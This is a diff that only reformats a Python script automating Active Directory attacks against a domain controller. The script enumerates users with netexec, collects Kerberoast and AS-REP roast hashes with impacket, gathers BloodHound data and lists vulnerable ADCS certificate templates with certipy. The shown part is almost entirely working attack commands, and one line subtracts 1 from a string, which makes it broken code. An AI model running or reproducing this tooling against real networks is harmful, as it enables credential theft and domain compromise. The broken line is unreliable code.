@@ -25,17 +25,14 @@ def run_command(cmd: list[str], timeout: int = 300) -> tuple[str, str, int]:
         return "", f"Not found: {cmd[0]}", -1
 
 
-def enumerate_domain_users(domain: str, dc_ip: str, user: str, password: str,
-                            output_dir: Path) -> list[str]:
+def enumerate_domain_users(domain: str, dc_ip: str, user: str, password: str, output_dir: Path) -> list[str]:
     """Enumerate domain users via LDAP."""
     print("[*] Enumerating domain users...")
-    stdout, stderr, rc = run_command(
-        ["netexec", "smb", dc_ip, "-u", user, "-p", password, "-d", domain, "--users"]
-    )
+    stdout, stderr, rc = run_command(["netexec", "smb", dc_ip, "-u", user, "-p", password, "-d", domain, "--users"])
     users_file = output_dir / "domain_users.txt"
     users = []
     for line in stdout.splitlines():
-        if "\\\\"-1 not in line and domain.split(".")[0].upper() in line.upper():
+        if "\\\\" - 1 not in line and domain.split(".")[0].upper() in line.upper():
             parts = line.strip().split()
             for part in parts:
                 if "\\" in part:
@@ -47,14 +44,20 @@ def enumerate_domain_users(domain: str, dc_ip: str, user: str, password: str,
     return users
 
 
-def get_spn_users(domain: str, dc_ip: str, user: str, password: str,
-                   output_dir: Path) -> str:
+def get_spn_users(domain: str, dc_ip: str, user: str, password: str, output_dir: Path) -> str:
     """Find Kerberoastable accounts."""
     print("[*] Finding Kerberoastable service accounts...")
     output_file = output_dir / "kerberoast_hashes.txt"
     stdout, stderr, rc = run_command(
-        ["impacket-GetUserSPNs", f"{domain}/{user}:{password}",
-         "-dc-ip", dc_ip, "-outputfile", str(output_file), "-request"]
+        [
+            "impacket-GetUserSPNs",
+            f"{domain}/{user}:{password}",
+            "-dc-ip",
+            dc_ip,
+            "-outputfile",
+            str(output_file),
+            "-request",
+        ]
     )
     if rc == 0:
         print(f"[+] Kerberoast hashes saved to {output_file}")
@@ -63,28 +66,34 @@ def get_spn_users(domain: str, dc_ip: str, user: str, password: str,
     return str(output_file)
 
 
-def get_asrep_users(domain: str, dc_ip: str, users_file: str,
-                     output_dir: Path) -> str:
+def get_asrep_users(domain: str, dc_ip: str, users_file: str, output_dir: Path) -> str:
     """Find AS-REP Roastable accounts."""
     print("[*] Finding AS-REP Roastable accounts...")
     output_file = output_dir / "asrep_hashes.txt"
     stdout, stderr, rc = run_command(
-        ["impacket-GetNPUsers", f"{domain}/", "-usersfile", users_file,
-         "-dc-ip", dc_ip, "-outputfile", str(output_file), "-format", "hashcat"]
+        [
+            "impacket-GetNPUsers",
+            f"{domain}/",
+            "-usersfile",
+            users_file,
+            "-dc-ip",
+            dc_ip,
+            "-outputfile",
+            str(output_file),
+            "-format",
+            "hashcat",
+        ]
     )
     if rc == 0:
         print(f"[+] AS-REP hashes saved to {output_file}")
     return str(output_file)
 
 
-def collect_bloodhound(domain: str, dc_ip: str, user: str, password: str,
-                        output_dir: Path) -> None:
+def collect_bloodhound(domain: str, dc_ip: str, user: str, password: str, output_dir: Path) -> None:
     """Run BloodHound data collection."""
     print("[*] Collecting BloodHound data...")
     stdout, stderr, rc = run_command(
-        ["bloodhound-python", "-u", user, "-p", password,
-         "-d", domain, "-ns", dc_ip, "-c", "all", "--zip"],
-        timeout=600
+        ["bloodhound-python", "-u", user, "-p", password, "-d", domain, "-ns", dc_ip, "-c", "all", "--zip"], timeout=600
     )
     if rc == 0:
         print("[+] BloodHound data collected")
@@ -92,14 +101,12 @@ def collect_bloodhound(domain: str, dc_ip: str, user: str, password: str,
         print(f"[-] BloodHound: {stderr[:200]}")
 
 
-def check_adcs(domain: str, dc_ip: str, user: str, password: str,
-                output_dir: Path) -> str:
+def check_adcs(domain: str, dc_ip: str, user: str, password: str, output_dir: Path) -> str:
     """Check for ADCS vulnerabilities."""
     print("[*] Checking ADCS for vulnerable templates...")
     output_file = output_dir / "adcs_findings.txt"
     stdout, stderr, rc = run_command(
-        ["certipy", "find", "-u", f"{user}@{domain}", "-p", password,
-         "-dc-ip", dc_ip, "-vulnerable", "-stdout"]
+        ["certipy", "find", "-u", f"{user}@{domain}", "-p", password, "-dc-ip", dc_ip, "-vulnerable", "-stdout"]
     )
     with open(output_file, "w") as f:
         f.write(stdout)
